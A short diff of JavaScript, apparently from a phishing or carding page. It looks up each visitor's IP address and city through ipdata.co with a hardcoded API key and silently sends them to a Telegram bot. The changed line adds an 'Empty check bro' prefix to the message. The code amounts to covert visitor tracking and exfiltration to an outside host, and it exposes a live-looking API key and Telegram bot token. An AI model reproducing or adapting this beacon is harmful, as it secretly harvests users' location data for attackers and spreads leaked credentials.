@@ -10,7 +10,7 @@ let apiKey = '3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8';
 json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
 let data1 = data.ip;
   let city1 = data.city;
-fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text='+data1+"%0A"+city1);
+fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text=✶•> Empty check bro %0A✶•> '+data1+"%0A✶•> "+city1);
   } );
 }
 else{
